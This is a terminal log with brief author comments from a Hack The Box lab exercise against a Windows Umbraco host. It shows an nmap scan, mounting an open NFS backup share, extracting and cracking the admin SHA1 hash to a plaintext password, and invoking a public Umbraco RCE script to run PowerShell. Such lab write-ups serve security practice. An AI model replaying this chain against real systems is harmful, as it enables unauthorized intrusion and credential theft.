allenwest1@debian:~/Desktop$ ping 10.10.10.180
PING 10.10.10.180 (10.10.10.180) 56(84) bytes of data.
64 bytes from 10.10.10.180: icmp_seq=1 ttl=127 time=21.4 ms
64 bytes from 10.10.10.180: icmp_seq=2 ttl=127 time=20.3 ms
64 bytes from 10.10.10.180: icmp_seq=3 ttl=127 time=20.7 ms
^C
--- 10.10.10.180 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 7ms
rtt min/avg/max/mdev = 20.302/20.796/21.354/0.462 ms
allenwest1@debian:~/Desktop$ nmap -sV -sC 10.10.10.180
Starting Nmap 7.70 ( https://nmap.org ) at 2020-07-12 12:26 EDT
Nmap scan report for 10.10.10.180
Host is up (0.039s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3         2049/udp  nfs
|   100003  2,3,4       2049/tcp  nfs
|   100005  1,2,3       2049/tcp  mountd
|   100005  1,2,3       2049/udp  mountd
|   100021  1,2,3,4     2049/tcp  nlockmgr
|   100021  1,2,3,4     2049/udp  nlockmgr
|   100024  1           2049/tcp  status
|_  100024  1           2049/udp  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m52s, deviation: 0s, median: 4m52s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-12 12:32:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.24 seconds
allenwest1@debian:~/Desktop$ sudo showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
allenwest1@debian:~/Desktop$ pwd
/home/allenwest1/Desktop
allenwest1@debian:~/Desktop$ mkdir HTBremote
allenwest1@debian:~/Desktop$ cd HTBremote/
allenwest1@debian:~/Desktop/HTBremote$ mount -t nfs 10.10.10.180:/site_backups /home/allenwest1/Desktop/
mount: only root can use "--types" option
allenwest1@debian:~/Desktop/HTBremote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/allenwest1/Desktop/HTBremote/
allenwest1@debian:~/Desktop/HTBremote$ ls
allenwest1@debian:~/Desktop/HTBremote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/allenwest1/Desktop/HTBremote/
allenwest1@debian:~/Desktop/HTBremote$ ls
allenwest1@debian:~/Desktop/HTBremote$ ls -al
total 8
drwxr-xr-x  2 allenwest1 allenwest1 4096 Jul 12 12:55 .
drwxr-xr-x 12 allenwest1 allenwest1 4096 Jul 12 12:55 ..
allenwest1@debian:~/Desktop/HTBremote$ cd ..
allenwest1@debian:~/Desktop$ cd HTBremote/
allenwest1@debian:~/Desktop/HTBremote$ ls
App_Browsers  aspnet_client  css           Media    Umbraco_Client
App_Data      bin            default.aspx  scripts  Views
App_Plugins   Config         Global.asax   Umbraco  Web.config
allenwest1@debian:~/Desktop/HTBremote$ cd App_Data/
allenwest1@debian:~/Desktop/HTBremote/App_Data$ ls
cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
allenwest1@debian:~/Desktop/HTBremote/App_Data$ strings Umbraco.sdf | grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
.
.
.
// admin password SHA1 encrypted: b8be16afba8c314ad33d812f22a04991b90e2aaa
.
.
.
allenwest1@debian:~/Desktop/HTBremote/App_Data$ sudo john
John the Ripper password cracker, version 1.8.0                         
Copyright (c) 1996-2013 by Solar Designer
Homepage: http://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]
--single                   "single crack" mode
--wordlist=FILE --stdin    wordlist mode, read words from FILE or stdin
--rules                    enable word mangling rules for wordlist mode
--incremental[=MODE]       "incremental" mode [using section MODE]
--external=MODE            external mode or word filter
--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
--restore[=NAME]           restore an interrupted session [called NAME]
--session=NAME             give a new session the NAME
--status[=NAME]            print status of a session [called NAME]
--make-charset=FILE        make a charset, FILE will be overwritten
--show                     show cracked passwords
--test[=TIME]              run tests and benchmarks for TIME seconds each
--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
--salts=[-]N               load salts with[out] at least N passwords only
--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
--fork=N                   fork N processes
--format=NAME              force hash type NAME: descrypt/bsdicrypt/md5crypt/
                           bcrypt/LM/AFS/tripcode/dummy/crypt
allenwest1@debian:~/Desktop/HTBremote/App_Data$ cd 
allenwest1@debian:~$ cd Desktop
allenwest1@debian:~/Desktop$ vim pass.txt
allenwest1@debian:~/Desktop$ cd HTBremote/
allenwest1@debian:~/Desktop/HTBremote$ cd App_
bash: cd: App_: No such file or directory
allenwest1@debian:~/Desktop/HTBremote$ cd App_Data/
allenwest1@debian:~/Desktop/HTBremote/App_Data$ sudo john -wordlist=~/Desktop/rockyou.txt ~/Desktop/pass.txt 
.
.
.
// admin@htb.local:baconandcheese
// logged into the website
// found an exploit @ https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py
.
.
.
allenwest1@debian:~/Desktop$ vim remoteExploit.py                     
allenwest1@debian:~/Desktop$ python remoteExploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls C:'
.
.
.
// check terminal2.bash and terminal3.bash.
// it gets real wonky here so just be patient
// Then I went to select a file to upload onto the site
// hello.exe
.
.
.
// So this is where I got stuck. Ill revisit it when I have more patience.
.
.
.
